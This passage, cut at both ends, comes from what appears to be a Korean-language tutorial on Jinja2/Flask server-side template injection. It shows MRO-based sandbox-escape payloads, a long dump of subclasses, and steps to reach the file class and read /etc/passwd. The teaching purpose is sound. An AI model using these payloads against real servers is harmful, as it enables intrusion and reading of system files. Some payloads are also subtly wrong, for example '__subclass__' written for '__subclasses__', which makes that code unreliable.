punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PRESERVE_CONTEXT_ON_EXCEPTION'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_REFRESH_EACH_REQUEST'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TRAP_HTTP_EXCEPTIONS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">}</span><span class=\"token operator\">></span> !!!</code></pre></div>\n<h3 id=\"ssti-sandbox-escape\" style=\"position:relative;\"><a href=\"#ssti-sandbox-escape\" aria-label=\"ssti sandbox escape permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSTI Sandbox Escape</h3>\n<ul>\n<li>대상 서버 환경에서 파일 읽기 및 시스템 함수를 호출하기 위해서는 SandBox를 탈출해야 합니다.</li>\n<li><code class=\"language-text\">open('/etc/passwd', 'rb').read()</code> 형태로 사용이 불가능 합니다.</li>\n<li>SandBox 탈출하기 위해서는 MRO를 이용하여 사용할 수 있는 클래스를 찾아야 합니다.</li>\n</ul>\n<p>Method Resolution Order (<strong>MRO)?</strong></p>\n<ul>\n<li>python 클래스 계층 구조에서 메서드를 찾는 순서 입니다.</li>\n<li>현재 클래스와 연관된 모든 클래스를 확인할 수 있습니다.</li>\n</ul>\n<p><strong>SSTI MRO</strong></p>\n<ul>\n<li>호출을 하게 되면 <code class=\"language-text\">&lt;type 'str'></code>, <code class=\"language-text\">&lt;type 'basestring'></code>, <code class=\"language-text\">&lt;type 'object'></code> 3가지 가 출력됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>그중에서 object class로 들어가서 서브 클래스를 출력하고 싶다면 다음과 같이 object의 서브 클래스들을 출력하면 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>\n<p><strong>response</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'type'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakref'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakcallableproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'weakproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'int'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'basestring'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'bytearray'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'list'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'NoneType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'NotImplementedType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'traceback'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'super'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'xrange'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'set'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'slice'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'staticmethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'complex'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'float'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'buffer'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'long'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'frozenset'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'property'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'memoryview'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'tuple'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'enumerate'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'reversed'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'code'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'frame'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'builtin_function_or_method'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'instancemethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'function'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'classobj'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dictproxy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'generator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'getset_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'wrapper_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'instance'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'ellipsis'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'member_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'file'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'PyCapsule'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cell'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'callable-iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.long_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.float_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'EncodingMap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'fieldnameiterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'formatteriterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.version_info'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'sys.flags'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'exceptions.BaseException'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'module'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'imp.NullImporter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'zipimport.zipimporter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'posix.stat_result'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'posix.statvfs_result'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'warnings.WarningMessage'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'warnings.catch_warnings'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_weakrefset._IterationGuard'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_weakrefset.WeakSet'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Hashable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'classmethod'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Iterable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Sized'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Container'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'_abcoll.Callable'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_keys'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_items'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'dict_values'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site._Printer'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site._Helper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Pattern'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Match'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_sre.SRE_Scanner'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'site.Quitter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'codecs.IncrementalEncoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'codecs.IncrementalDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'string.Template'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'string.Formatter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'collections.deque'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'deque_iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'deque_reverse_iterator'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.itemgetter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.attrgetter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'operator.methodcaller'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.combinations'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.combinations_with_replacement'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.cycle'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.dropwhile'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.takewhile'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.islice'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.starmap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.imap'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.chain'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.compress'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.ifilter'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.ifilterfalse'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.count'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.izip'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.izip_longest'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.permutations'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.product'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.repeat'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.groupby'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.tee_dataobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools.tee'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'itertools._grouper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_thread._localdummy'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'thread._local'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'thread.lock'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'method_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'markupsafe._MarkupEscapeHelper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_io._IOBase'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_io.IncrementalNewlineDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_hashlib.HASH'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_random.Random'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cStringIO.StringO'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cStringIO.StringI'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cPickle.Unpickler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cPickle.Pickler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'functools.partial'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_ssl._SSLContext'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_ssl._SSLSocket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._closedsocket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_socket.socket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._socketobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._fileobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'time.struct_time'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'Struct'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'urlparse.ResultMixin'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'contextlib.GeneratorContextManager'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'contextlib.closing'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_json.Scanner'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_json.Encoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'json.decoder.JSONDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'json.encoder.JSONEncoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'threading._Verbose'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.MissingType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.LRUCache'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.Cycler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> 'jinja2<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span>Joiner’<span class=\"token operator\">></span> …</code></pre></div>\n</li>\n<li>\n<p>출력된 결과에서 n번째 클래스를 선택하면 파일 클래스를 찾을 수 있습니다.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token comment\"># => &lt;type 'file'></span></code></pre></div>\n<ul>\n<li>sub class의 file class를 찾았다면은 <code class=\"language-text\">open('/etc/passwd/').read()</code> 호출하여 파일을 읽을 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token 